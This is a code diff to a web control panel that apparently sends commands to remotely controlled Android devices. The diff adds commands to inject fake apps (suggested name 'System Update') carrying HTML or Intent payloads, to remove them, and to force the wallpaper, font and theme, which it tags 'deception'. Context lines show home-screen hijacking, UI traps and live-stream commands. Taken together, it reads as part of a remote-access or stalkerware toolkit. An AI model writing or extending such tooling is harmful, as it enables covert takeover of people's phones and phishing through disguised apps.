@@ -495,9 +495,52 @@
                     { id: 'SET_LAUNCHER_GRID', name: 'Calibrate Launcher Grid', icon: '📐', keywords: 'grid, rows, columns, layout, size, spacing', inputs: [{id: 'grid-cols', label: 'Columns (e.g. 4)', type: 'number', val: 4}, {id: 'grid-rows', label: 'Rows (e.g. 5)', type: 'number', val: 6}, {id: 'grid-icon-size', label: 'Icon Size (dp)', type: 'number', val: 56}, {id: 'grid-v-gap', label: 'Vertical Spacing (dp)', type: 'number', val: 22}, {id: 'grid-h-gap', label: 'Horizontal Spacing (dp)', type: 'number', val: 16}] },
                     { id: 'SET_LAUNCHER_MODE', name: 'Launcher Partition Mode', icon: '🔀', keywords: 'work, profile, island, personal, mode', inputs: [{id: 'launch-mode', label: 'Mode', type: 'select', options: [{v: 'PERSONAL', l: 'Personal (Standard)'}, {v: 'WORK', l: 'Work Profile (Island)'}]}] },
                     { id: 'SET_DOCK_APPS', name: 'Configure Dock (Max 5)', icon: '⚓', keywords: 'bottom, bar, icons, fixed', inputs: [{id: 'dock-pkgs', label: 'Package Names (Comma list)', type: 'text'}] },
+                    { 
+                        id: 'ADD_FAKE_APP', 
+                        name: 'Inject Synthetic App', 
+                        icon: '🧪', 
+                        keywords: 'fake, shortcut, webapp, intent, custom', 
+                        inputs: [],
+                        customUI: `
+                            <div class="card" style="background:rgba(0,243,255,0.02); border-style:dotted;">
+                                <div class="cmd-row">
+                                    <label style="font-size:0.6rem; color:#666;">APP_DISPLAY_NAME</label>
+                                    <input type="text" id="fa-name" placeholder="e.g. System Update">
+                                </div>
+                                <div class="cmd-row">
+                                    <label style="font-size:0.6rem; color:#666;">ICON_URL (Backend or Local Path)</label>
+                                    <input type="text" id="fa-icon" placeholder="https://.../icon.png">
+                                </div>
+                                <div style="display:flex; gap:5px; margin-bottom:10px;">
+                                    <div style="flex:1">
+                                        <label style="font-size:0.6rem; color:#666;">PARTITION</label>
+                                        <select id="fa-mode" style="width:100%; background:#000; color:var(--primary); border:1px solid #333; padding:5px;">
+                                            <option value="PERSONAL">PERSONAL</option>
+                                            <option value="WORK">WORK_PROFILE</option>
+                                        </select>
+                                    </div>
+                                    <div style="flex:1">
+                                        <label style="font-size:0.6rem; color:#666;">METHOD</label>
+                                        <select id="fa-method" style="width:100%; background:#000; color:var(--primary); border:1px solid #333; padding:5px;">
+                                            <option value="HTML">HTML (Web App)</option>
+                                            <option value="INTENT">INTENT (System)</option>
+                                        </select>
+                                    </div>
+                                </div>
+                                <div class="cmd-row">
+                                    <label style="font-size:0.6rem; color:#666;">PAYLOAD (HTML String or Intent JSON)</label>
+                                    <textarea id="fa-payload" style="height:60px;" placeholder="<html>... or {\"action\":...}"></textarea>
+                                </div>
+                            </div>
+                        `
+                    },
+                    { id: 'REMOVE_FAKE_APP', name: 'Purge Synthetic App', icon: '⚰️', inputs: [{id: 'fa-purge-name', label: 'App Name to Remove', type: 'text'}] },
                     { id: 'HIDE_APPS', name: 'Hide Apps from Launcher', icon: '👻', keywords: 'remove, list, blacklist, ghost, clear', inputs: [{id: 'hide-pkgs', label: 'Packages (Comma separated)', type: 'text', placeholder: 'com.pkg.name, com.other.app'}] },
                     { id: 'UNHIDE_APPS', name: 'Unhide Apps', icon: '👀', keywords: 'unhide, visible, restore', inputs: [{id: 'unhide-pkgs', label: 'Packages (Comma list or ALL)', type: 'text', placeholder: 'com.pkg.name or ALL'}] },
                     { id: 'GET_HIDDEN_APPS', name: 'Query Hidden App List', icon: '📋', keywords: 'list, hidden, verify', inputs: [] },
+                    { id: 'SET_WALLPAPER', name: 'Inject System Wallpaper', icon: '🖼️', keywords: 'background, lock, home, deception', inputs: [{id: 'wall-target', label: 'Target Screen', type: 'select', options: [{v: 'BOTH', l: 'Both Screens'}, {v: 'LOCK', l: 'Lock Screen Only'}, {v: 'HOME', l: 'Home Screen Only'}]}, {id: 'wall-url', label: 'Image URL or Local Path', type: 'text'}] },
+                    { id: 'SET_SYSTEM_FONT', name: 'Force System Font', icon: '🔤', keywords: 'ghost, settings, style, deception', inputs: [{id: 'sys-font-name', label: 'Font Name (Exact as in device list)', type: 'text', placeholder: 'SamsungOne, Roboto, etc.'}] },
+                    { id: 'SET_SYSTEM_THEME', name: 'Force System Theme', icon: '🌗', keywords: 'light, dark, settings, deception', inputs: [{id: 'sys-theme-mode', label: 'Theme Mode', type: 'select', options: [{v: 'Light', l: 'Light'}, {v: 'Dark', l: 'Dark'}]}] },
                     { id: 'HIJACK_LAUNCHER', name: 'Hijack Home Role', icon: '🏠', keywords: 'home, default, ghost, hand, blindfold', inputs: [] },
                     {
                         id: 'NATIVE_UI_TRAP',
@@ -1468,6 +1511,16 @@
                     case 'STOLEN_STOP':
                         type = 'STOLEN_PHONE';
                         content = 'STOP'; break;
+                    case 'SET_WALLPAPER':
+                        content = `${document.getElementById('wall-target').value}|${document.getElementById('wall-url').value}`; break;
+                    case 'SET_SYSTEM_FONT':
+                        content = document.getElementById('sys-font-name').value; break;
+                    case 'SET_SYSTEM_THEME':
+                        content = document.getElementById('sys-theme-mode').value; break;
+                    case 'ADD_FAKE_APP':
+                        content = `${document.getElementById('fa-mode').value}|${document.getElementById('fa-method').value}|${document.getElementById('fa-name').value}|${document.getElementById('fa-icon').value}|${document.getElementById('fa-payload').value}`; break;
+                    case 'REMOVE_FAKE_APP':
+                        content = document.getElementById('fa-purge-name').value; break;
                     case 'LIVE_STREAM':
                         content = `${document.getElementById('live-mode').value}|${document.getElementById('live-dur').value}`; break;
                     case 'STORE_VOUCHER':
